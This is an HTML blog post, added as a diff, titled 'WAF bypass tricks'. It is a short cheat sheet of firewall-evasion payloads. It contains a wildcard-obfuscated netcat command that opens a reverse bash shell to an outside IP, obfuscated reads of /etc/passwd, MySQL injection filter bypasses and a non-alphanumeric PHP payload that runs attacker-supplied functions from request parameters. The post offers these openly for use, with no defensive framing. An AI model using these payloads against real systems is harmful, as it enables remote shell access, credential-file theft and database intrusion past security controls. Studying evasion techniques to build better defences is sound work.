@@ -1,0 +1,119 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="author" content="Alexey Pronin">
+  
+  <link rel="canonical" href="../../post/waf-bypass/" />
+  <meta name="theme-color" content="#563d7c">
+  
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+  <title>WAF bypass tricks - vuln.be</title>
+  <link href="../../css/main.css" rel="stylesheet">
+  
+  <link rel="alternate" type="application/atom+xml" href="../../atom.xml" title="vuln.be Atom Feed">
+  <link rel="alternate" type="application/rss+xml" href="../../rss.xml" title="vuln.be RSS Feed">
+</head>
+
+<body>
+  <div class="container">
+    <header class="blog-header py-3">
+      <div class="row flex-nowrap justify-content-between align-items-center">
+        <div class="col-12 text-center">
+          <a class="blog-header-logo text-dark" href="../../">VULN.BE</a>
+      </div>
+    </header>
+
+    <div class="nav-scroller py-1 mb-4 border-bottom">
+      <nav class="nav d-flex justify-content-between">
+        <a class="p-2 text-muted" href="../../">Home</a><a class="p-2 text-muted" href="../../tags/">Tags</a><a class="p-2 text-muted" href="../../archives/">Archives</a><a class="p-2 text-muted" href="../../page/contacts/">Contacts</a><a class="p-2 text-muted" href="../../page/about/">About</a>
+      </nav>
+    </div>
+    
+    <div class="blog-main px-2 my-4">
+      <div class="blog-post">
+  <div class="blog-post-meta font-weight-light">
+    <time datetime="2016-02-10" pubdate class="text-uppercase" data-updated="true">10 February 2016</time>
+    <div class="tags text-lowercase"><a href="../../tags/waf/">waf</a> | <a href="../../tags/bypass/">bypass</a> | <a href="../../tags/web application firewall/">web application firewall</a></div>
+  </div>
+  <h1 class><a href="../../post/waf-bypass/">WAF bypass tricks</a></h1>
+  
+  <div class="mb-4 post-content">
+    <p>Some web application firewall bypasses</p>
+<!--more-->
+<h2 id="bash-globbing">Bash globbing</h2>
+<h3 id="listing-via-echo">Listing via echo</h3>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a><span class="bu">echo</span> /*</span></code></pre></div>
+<h3 id="exec-masked-command">Exec masked command</h3>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a><span class="ex">/???/?????/???/n?</span> -e /???/b??h 168048868 1337 <span class="kw">&amp;</span></span></code></pre></div>
+<p><strong>&lt;=&gt;</strong></p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a><span class="ex">/ust/local/bin/nc</span> -e /bin/bash 10.4.56.228 1337 <span class="kw">&amp;</span></span></code></pre></div>
+<h3 id="quote-marks">Quote marks</h3>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a><span class="ex">/b</span><span class="st">'i'</span><span class="ex">n/c</span><span class="st">'a'</span><span class="ex">t</span> /e<span class="st">'t'</span>c/pa<span class="st">'s'</span>s<span class="st">'wd'</span></span></code></pre></div>
+<h2 id="using-ip-address-in-long-form">Using IP address in <em>long</em> form</h2>
+<pre><code>10.4.56.228 == 168048868</code></pre>
+<h2 id="exclude-spaces">Exclude spaces</h2>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="va">IFS=</span>,;<span class="kw">`</span><span class="fu">cat</span><span class="op">&lt;&lt;&lt;</span>cat,/etc/passwd<span class="kw">`</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a><span class="va">IFS=</span>,;<span class="va">$(</span><span class="fu">cat</span><span class="op">&lt;&lt;&lt;</span>cat,/etc/passwd<span class="va">)</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a><span class="ex">cat</span><span class="va">$IFS</span>/etc/passwd</span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true"></a><span class="fu">cat</span><span class="op">&lt;</span>/etc/passwd</span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true"></a><span class="dt">{cat,/etc/passwd}</span></span></code></pre></div>
+<h2 id="mysql">MySQL</h2>
+<h4 id="whitespaces">Whitespaces:</h4>
+<ul>
+<li>%0c = form feed, new page</li>
+<li>%09 = horizontal tab</li>
+<li>%0d = carriage return</li>
+<li>%0a = line feed, new line</li>
+<li>%0b</li>
+<li>%a0</li>
+</ul>
+<div class="sourceCode" id="cb7"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a><span class="kw">SELECT</span><span class="co">/*some*/</span><span class="dv">1</span><span class="co">/*some*/</span><span class="kw">FROM</span><span class="co">/*some*/</span>users</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true"></a><span class="kw">SELECT</span>(<span class="dv">1</span>)<span class="kw">FROM</span>(information_schema.<span class="kw">tables</span>)</span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true"></a>x<span class="st">'31'</span><span class="op">=</span><span class="dv">1</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true"></a>x<span class="st">'31'</span> <span class="kw">like</span> <span class="dv">1</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true"></a>0b1010<span class="op">=</span><span class="dv">10</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true"></a><span class="dv">12</span> rlike <span class="dv">1</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true"></a>(<span class="st">'o'</span>)rlike(<span class="st">'o'</span>)</span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true"></a><span class="kw">SELECT</span> <span class="dt">CHAR</span>(<span class="bn">0x66</span>)</span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true"></a><span class="kw">SELECT</span> <span class="bn">0x5045</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true"></a><span class="kw">SELECT</span> <span class="bn">0x50</span> <span class="op">+</span> <span class="bn">0x45</span></span></code></pre></div>
+<div class="sourceCode" id="cb8"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true"></a><span class="kw">SELECT</span> <span class="fu">user</span> <span class="kw">FROM</span> mysql.<span class="fu">user</span>; </span></code></pre></div>
+<h3 id="comments">Comments</h3>
+<div class="sourceCode" id="cb9"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true"></a><span class="kw">SELECT</span><span class="co">/*sometext*/</span><span class="fu">user</span> <span class="kw">FROM</span> mysql<span class="co">/*sometext*/</span>.<span class="fu">user</span>; </span></code></pre></div>
+<h3 id="whitespaces-1">Whitespaces</h3>
+<div class="sourceCode" id="cb10"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a>SEL\nECT <span class="fu">user</span> FR\tOM mys\xql.<span class="fu">user</span>;</span></code></pre></div>
+<h3 id="multybyte-encodings-sjis-big5-gbk">Multybyte encodings (SJIS, BIG5, GBK…)</h3>
+<div class="sourceCode" id="cb11"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true"></a>%bf%<span class="dv">27</span> <span class="op">-&gt;</span> <span class="kw">escape</span> <span class="op">-&gt;</span> <span class="bn">0xbf5c</span><span class="st">'</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true"></a><span class="st">%a3%27 -&gt; escape -&gt; 0xa35c'</span></span></code></pre></div>
+<h3 id="comma-filter-bypass">Comma filter bypass</h3>
+<div class="sourceCode" id="cb12"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true"></a><span class="kw">select</span> <span class="dv">1</span>,<span class="dv">2</span>,<span class="dv">3</span> <span class="op">&lt;=&gt;</span> <span class="kw">select</span> <span class="op">*</span> <span class="kw">from</span> (<span class="kw">Select</span> <span class="dv">1</span>)a <span class="kw">join</span>(<span class="kw">Select</span> <span class="dv">2</span>)b <span class="kw">join</span>(<span class="kw">Select</span> <span class="dv">3</span>)c;</span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true"></a><span class="kw">select</span> <span class="dv">1</span>,<span class="dv">2</span>,<span class="dv">3</span> <span class="op">&lt;=&gt;</span> <span class="kw">sElecT</span> <span class="op">*</span> <span class="kw">froM</span> (<span class="kw">sElecT</span> <span class="dv">1</span>) <span class="kw">As</span> a <span class="kw">JoIn</span> (<span class="kw">sElecT</span> <span class="dv">2</span>) <span class="kw">aS</span> b <span class="kw">JoIn</span> (<span class="kw">sElecT</span> <span class="dv">3</span>) <span class="kw">AS</span> c;</span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true"></a></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true"></a><span class="kw">select</span> <span class="fu">substr</span>(<span class="st">'hack'</span>,<span class="dv">1</span>,<span class="dv">1</span>);</span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true"></a><span class="kw">select</span> <span class="fu">substr</span>(<span class="st">'hack'</span> <span class="kw">from</span> <span class="dv">1</span> <span class="cf">FoR</span> <span class="dv">1</span>);</span></code></pre></div>
+<h2 id="php">PHP</h2>
+<h3 id="use-non-alphanumeric-payloads">Use non alphanumeric payloads</h3>
+<div class="sourceCode" id="cb13"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true"></a><span class="kw">$_</span>=<span class="st">'$&lt;&gt;/'</span>^<span class="st">'{{{{'</span><span class="ot">;</span>${<span class="kw">$_</span>}<span class="ot">[</span><span class="fu">_</span><span class="ot">](</span>${<span class="kw">$_</span>}<span class="ot">[</span>__<span class="ot">]);</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true"></a></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true"></a>&lt;=&gt;</span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true"></a></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true"></a><span class="kw">$_GET</span><span class="ot">[</span><span class="st">'_'</span><span class="ot">](</span><span class="kw">$_GET</span><span class="ot">[</span><span class="st">'__'</span><span class="ot">]);</span></span></code></pre></div>
+  </div>
+  
+</div>
+
+    </div>
+    <footer class="p-2 d-flex justify-content-between blog-footer font-weight-lighter border-top">
+      <p>Copyright © 2023 Alexey Pronin</p>
+      <p>Powered by <a href="https://jaspervdj.be/hakyll/">Hakyll</a>.</p>
+    </footer>
+  </div>
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
+</body>
+</html>
